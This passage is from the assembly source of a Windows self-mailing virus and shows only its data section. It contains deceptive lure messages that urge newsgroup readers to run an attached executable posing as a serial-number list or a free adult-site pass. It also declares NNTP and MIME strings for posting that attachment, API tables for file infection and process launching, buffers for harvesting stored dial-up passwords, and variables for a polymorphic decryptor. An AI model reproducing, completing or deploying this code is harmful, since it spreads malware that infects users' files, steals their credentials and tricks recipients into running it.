				db 'be the program you have been waiting for.'
				db 0Ah,0Ah
				db 'We have collected serial numbers for many years and '
				db 'are now proud to release the very first version of our '
				db 'serial number collection, which contains more than '
				db '15.000 serial numbers.'
				db 0Ah,0Ah
				db 'Attached to this message is the very first version of '
				db 'our serial number collection.'
				db 0Ah,0Ah
				db 'Yours,',0Ah
				db 'Serial number collectors',0Ah
NGM_cracks_org	db '<cj_roland@quicknet.com>'
				db 0Ah,0Ah
				db '--'
				db 00h

NGM_cracks_sub	db 'New and even larger serial number list out now!'
				db 0Ah,00h

NGM_cracks_file	db 'lserial'					;Have to be 07h characters

                ;------------------------------------------------------------
				;Groups about sex
                ;------------------------------------------------------------

szSexDomain		db 'hoteens.com',0Ah,00h

groups_sex		equ $

				dd offset sz_news_group0F
				dd offset sz_news_group10
				dd offset sz_news_group11
				dd offset sz_news_group12
				dd offset sz_news_group13
				dd offset sz_news_group14
				dd offset sz_news_group15

				dd offset sz_news_group16
				dd offset sz_news_group17
				dd offset sz_news_group18
				dd offset sz_news_group19
				dd offset sz_news_group1A

NumOfSexNG		equ ($-groups_sex)/04h

NGM_body_sex	db 0Ah,0Ah
				db 'Dear potential customer,',0Ah,0Ah
				db 'We have just opened a new erotic site with more than '
				db '10.000 .JPGs and more than 1.000 '
				db '.MPG/.VIV/.AVI/.MOV/etc.'
				db 0Ah,0Ah
				db 'We offer you the opportunity of a lifetime, we are '
				db 'giving away a months access, without being charged, '
				db 'to our new site in exchange for your opinion.'
				db 0Ah,0Ah
				db 'All you have to do is execute the attached advert, '
				db 'which will generate your personal User ID, you dont '
				db 'even have to provide information as your personal '
				db 'credit card number, etc.'
				db 0Ah,0Ah
				db 'And if you like our site, please tell all your friends '
				db 'about us.'
				db 0Ah,0Ah
				db 'http://www.hoteens.com/',0Ah,0Ah
				db 'HoTeens.com',0Ah
NGM_sex_org		db '<opinion@hoteens.com>'
				db 0Ah,0Ah
				db '--'
				db 00h

NGM_sex_sub		db 'New and 100% free XXX site',0Ah,00h

NGM_sex_file	db 'hoteens'					;Have to be 07h characters

;----------------------------------------------------------------------------
;Strings used for talking with news server
;----------------------------------------------------------------------------

szNNTPcomm_00	db 'group '
NewsGroup_Name	db 28h dup (00h)
szNNTPcomm_01	db 'head',0Ah,00h
szNNTPcomm_02	db 'next',0Ah,00h

nntp_comm		equ $

				dd offset szNNTPcomm_00
				db 00h
				dd offset szNNTPcomm_01
				db 00h
				dd offset szNNTPcomm_02
				db 00h

num_nntp_comm	equ ($-nntp_comm)/05h

;----------------------------------------------------------------------------
;Strings used for building MIME headers
;----------------------------------------------------------------------------

szMIME_00		db 'MIME-Version: 1.0',0Ah
				db 'Content-Type: multipart/mixed;',0Ah
				db '	boundary=',22h,00h
szMIME_nextpart	db '----=_NextPart_000_0005_01BDE2FC.8B286C00',00h
szMIME_01		db 22h,0Ah
				db 'X-Priority: 3',0Ah
				db 'X-MSMail-Priority: Normal',0Ah
				db 'X-Unsent: 1',0Ah
				db 'X-MimeOLE: Produced By Microsoft MimeOLE V4.72.3110.3'
				db 0Ah
				db 'This is a multi-part message in MIME format.'
				db 0Ah,0Ah
				db '--'
				db 00h
szMIME_02		db 0Ah
				db 'Content-Type: text/plain;',0Ah
				db '	charset='
				db 22h
				db 'iso-8859-1'
				db 22h,0Ah
				db 'Content-Transfer-Encoding: quoted-printable',0Ah,00h

fake_mail_body	db 0Ah
				db 'This is an example of a self-mailing virus'
				db 0Ah,0Ah
				db '--'
				db 00h

szMIME_03		db 0Ah
				db 'Content-Type: application/octet-stream;',0Ah
				db '	name='
				db 22h
MIME_file_00	db '0123456'
				db '.exe'
				db 22h,0Ah
				db 'Content-Transfer-Encoding: base64',0Ah
				db 'Content-Disposition: attachment;',0Ah
				db '	filename='
				db 22h
MIME_file_01	db '0123456'
				db '.exe'
				db 22h,0Ah,0Ah,00h
szMIME_04		db '--',00h
szMIME_05		db '--',0Ah,0Ah,00h

mime_headers	equ $

				dd offset szMIME_00
				db 0FFh
				dd offset szMIME_nextpart
				db 0FFh
				dd offset szMIME_01
				db 0FFh
				dd offset szMIME_nextpart
				db 0FFh
				dd offset szMIME_02
				db 0FFh
AddrOfBody		dd 00000000h
				db 0FFh
				dd offset szMIME_nextpart
				db 0FFh
				dd offset szMIME_03
				db 0FFh

NumberOfMime	equ ($-mime_headers)/05h

mime_end		equ $

				dd offset szMIME_04
				db 0FFh
				dd offset szMIME_nextpart
				db 0FFh
				dd offset szMIME_05
				db 0FFh

NumberOfMimeEnd	equ ($-mime_end)/05h

;----------------------------------------------------------------------------
;Table used for BASE64 encoding
;----------------------------------------------------------------------------

TranslateTbl	equ $

				db 'A','B','C','D','E','F','G','H','I','J'
				db 'K','L','M','N','O','P','Q','R','S','T'
				db 'U','V','W','X','Y','Z','a','b','c','d'
				db 'e','f','g','h','i','j','k','l','m','n'
				db 'o','p','q','r','s','t','u','v','w','x'
				db 'y','z','0','1','2','3','4','5','6','7'
				db '8','9','+','/'

;----------------------------------------------------------------------------
;End of virus image in files
;----------------------------------------------------------------------------

inf_size		equ $-viro_sys
SizeOfProtect	equ $-CRC_protected
size_padding	equ 0065h

;----------------------------------------------------------------------------
;CRC32 lookup table
;
;This table is in virus uninitialized data area
;The table appears initialized here coz its needed for 1st
;virus generation
;----------------------------------------------------------------------------

tbl_crc32		dd 0100h dup (00000000h)

;----------------------------------------------------------------------------
;KERNEL32 API's
;----------------------------------------------------------------------------

a_GetProcAddress				dd 00000000h ;This API takes special care

epK32Apis						equ $

a_CreateFileA					dd 00000000h
a_CreateFileMappingA			dd 00000000h
a_MapViewOfFile					dd 00000000h
a_UnmapViewOfFile				dd 00000000h
a_CloseHandle					dd 00000000h
a_FindFirstFileA				dd 00000000h
a_FindNextFileA					dd 00000000h
a_FindClose						dd 00000000h
a_VirtualAlloc					dd 00000000h
a_GetWindowsDirectoryA			dd 00000000h
a_GetSystemDirectoryA			dd 00000000h
a_GetCurrentDirectoryA			dd 00000000h
a_SetFileAttributesA			dd 00000000h
a_GetFileAttributesA			dd 00000000h
a_SetFileTime					dd 00000000h
a_DeleteFileA					dd 00000000h
a_GetCurrentProcess				dd 00000000h
a_WriteProcessMemory			dd 00000000h
a_LoadLibraryA					dd 00000000h
a_FreeLibrary					dd 00000000h
a_GetSystemTime					dd 00000000h
a_SetFilePointer				dd 00000000h
a_SetEndOfFile					dd 00000000h
a_MoveFileA						dd 00000000h
a_ExitProcess					dd 00000000h
a_GetVersionExA					dd 00000000h
a_GetModuleFileNameA			dd 00000000h
a_CopyFileA						dd 00000000h
a_GetFileTime					dd 00000000h
a_CreateSemaphoreA				dd 00000000h
a_ReleaseSemaphore				dd 00000000h
a_CreateProcessA				dd 00000000h
a_WaitForSingleObject			dd 00000000h
a_GetCommandLineA				dd 00000000h
a_WriteFile						dd 00000000h
a_GetTempPathA					dd 00000000h

NumK32Apis						equ ($-epK32Apis)/04h

;----------------------------------------------------------------------------
;More handles (not used in virus critical initialization)
;----------------------------------------------------------------------------

h_WS32DLL		dd 00000000h
h_RASDLL		dd 00000000h
h_ADDLL			dd 00000000h
h_Semaphore		dd 00000000h
h_RegKey		dd 00000000h
h_Find			dd 00000000h

;----------------------------------------------------------------------------
;Structures used by CreateProcess
;----------------------------------------------------------------------------

Process_Info	equ $

PI_hProcess		dd 00000000h
PI_hThread		dd 00000000h
PI_ProcessId	dd 00000000h
PI_ThreadId		dd 00000000h

SIZEOF_PI		equ $-Process_Info
SIZEOF_SI		equ 0011h

StartUp_Info	dd SIZEOF_SI dup (00h)				

;----------------------------------------------------------------------------
;End of virus virtual image
;----------------------------------------------------------------------------

size_virtual	equ $-viro_sys

;----------------------------------------------------------------------------
;WSOCK32 API's
;----------------------------------------------------------------------------

epWS32Apis						equ $

a_WSAStartup					dd 00000000h
a_inet_addr						dd 00000000h
a_gethostbyaddr					dd 00000000h
a_htons							dd 00000000h
a_socket						dd 00000000h
a_connect						dd 00000000h
a_send							dd 00000000h
a_recv							dd 00000000h
a_closesocket					dd 00000000h
a_WSACleanup					dd 00000000h

NumWS32Apis						equ ($-epWS32Apis)/04h

;----------------------------------------------------------------------------
;RASAPI32 API's
;----------------------------------------------------------------------------

epRASApis						equ $

a_RasEnumConnectionsA			dd 00000000h
a_RasEnumEntriesA				dd 00000000h
a_RasGetEntryDialParamsA		dd 00000000h

NumRASApis						equ ($-epRASApis)/04h

;----------------------------------------------------------------------------
;ADVAPI32 API's
;----------------------------------------------------------------------------

epADApis						equ $

a_RegOpenKeyA					dd 00000000h
a_RegQueryValueA				dd 00000000h
a_RegCloseKey					dd 00000000h

NumADApis						equ ($-epADApis)/04h

;----------------------------------------------------------------------------
;Misc variables
;----------------------------------------------------------------------------

search_raw		dd 00000000h
BytesWritten	dd 00000000h
key_size		dd 00000000h

;----------------------------------------------------------------------------
;Poly engine uninitialized data
;----------------------------------------------------------------------------

ptr_disp        dd 00000000h    ;Displacement from index
disp2disp       dd 00000000h    ;Displacement over displacement 
end_value       dd 00000000h    ;Index end value
delta_call      dd 00000000h    ;Used into delta_offset routines
loop_point      dd 00000000h    ;Start address of decryption loop
entry_point     dd 00000000h    ;Entry point to decryptor code
decryptor_size  dd 00000000h    ;Size of generated decryptor
crypt_key       dd 00000000h    ;Encryption key
ep_junk_addr	dd 00000000h	;Address of poly block for entry-point
ep_junk_fix		dd 00000000h	;Size correction
oper_size       db 00h          ;Size used (1=Byte 2=Word 4=Dword)
index_mask      db 00h          ;Mask of register used as index
counter_mask    db 00h          ;Mask of register used as counter
build_flags     db 00h          ;Some decryptor flags
recursive_level db 00h          ;Garbage recursive layer

                ;Decryptor flags aliases

CRYPT_DIRECTION equ 01h
CRYPT_CMPCTR    equ 02h
CRYPT_CDIR      equ 04h
CRYPT_SIMPLEX   equ 10h
CRYPT_COMPLEX   equ 20h

;----------------------------------------------------------------------------
;Information about currently opened file
;----------------------------------------------------------------------------

CurFileAttr		dd 00000000h
h_CreateFile	dd 00000000h
h_FileMap		dd 00000000h

FileLastWriteT	equ $

				dd 00000000h
				dd 00000000h

FileLastAccessT	equ $

				dd 00000000h
				dd 00000000h

FileCreationT	equ $

				dd 00000000h
				dd 00000000h

;----------------------------------------------------------------------------
;Buffers used for path and filename manipulation routines
;----------------------------------------------------------------------------

BufDeleteOnExit	db MAX_PATH	dup (00000000h)

BufStrFilename	db MAX_PATH	dup (00000000h)

BufStr2Upper	db MAX_PATH	dup (00000000h)

string_padd		db 00h
BufGetDir		db MAX_PATH	dup (00000000h)

;----------------------------------------------------------------------------
;Buffers for information about RAS connections
;----------------------------------------------------------------------------

Num_Ras_Entries	equ 100h

;Here comes the equates and the buffers needed for RasEnumConnections

SIZEOF_RASCONN	equ 019Ch
RAS_NAMES_NT	equ SIZEOF_RASCONN*Num_Ras_Entries

;Here comes the equates and the buffer needed for RasEnumEntries

SIZEOF_RASENTRY	equ 0108h
RASE_NAMES_NT	equ SIZEOF_RASENTRY*Num_Ras_Entries

;Buffers used by RasEnumConnections and RasEnumEntries

number_of_names	dd 00000000h
size_of_names	dd 00000000h

RAS_buffer		db SIZEOF_RASCONN*Num_Ras_Entries dup (00h)

;Here comes the equates for RasGetEntryDialParams

SIZEOF_RASPARAM	equ 041Ch

;This buffers are used by RasGetEntryDialParams

RASP_ret_passwd	dd 00000000h

RASP_INFO		db SIZEOF_RASPARAM dup (00h)

;----------------------------------------------------------------------------
;Buffers for information about socket
;----------------------------------------------------------------------------

AF_INET			equ 00000002h
SOCK_STREAM		equ 00000001h

InetAddr		dd 00000000h
conn_sock		dd 00000000h

WSA_data		equ $

WSA_ver_low		dw 0000h
WSA_ver_high	dw 0000h
WSA_description	db 0101h dup (00h)
WSA_sys_stat	db 0081h dup (00h)
WSA_max_sockets	dw 0000h
WSA_max_udp_dg	dw 0000h
WSA_vendor_info dd 00000000h

SockAddrIn		equ $

sin_family		dw 0000h
sin_port		dw 0000h
sin_addr		dd 00000000h
sin_zero		db 08h dup (00h)

SizeOfAddrIn	equ $-SockAddrIn

use_server		dd 00000000h
use_port		dd 00000000h

SIZEOF_RECVBUF	equ 1000h
RecvBuffer		db SIZEOF_RECVBUF dup (00h)

;----------------------------------------------------------------------------
;Buffer for information about operating system version
;----------------------------------------------------------------------------

OsVersionInfo	equ $

OSVerInfoSize	dd 00000000h
OSVerMajorVer	dd 00000000h
OSVerMinorVer	dd 00000000h
OSVerBuildNum	dd 00000000h
OSVerPlatform	dd 00000000h
OSStrVer		db 80h dup (00h)

SizeOfOsVersion	equ $-OsVersionInfo

;----------------------------------------------------------------------------
;Buffer used for BASE64 encoding
;----------------------------------------------------------------------------

BeatCounter		dd 00000000h

BeatBuffer		db 50h*08h dup (00h)

;----------------------------------------------------------------------------
;This is a WIN32 FindData structure used to infect files
;----------------------------------------------------------------------------

DirectFindData	db SIZEOF_WIN32_FIND_DATA dup (00h)

;----------------------------------------------------------------------------
;Buffer used by the polymorphic engine to generate the decryptor
;----------------------------------------------------------------------------

poly_buffer		equ $

				db 1000h dup (00h)

;----------------------------------------------------------------------------
;Size of buffer used to build a dropper
;----------------------------------------------------------------------------

SIZEOF_DROPPER	equ 5000h

;----------------------------------------------------------------------------
;End of virus image in allocated memory
;----------------------------------------------------------------------------

alloc_size		equ $-viro_sys

virseg          ends
                end host_code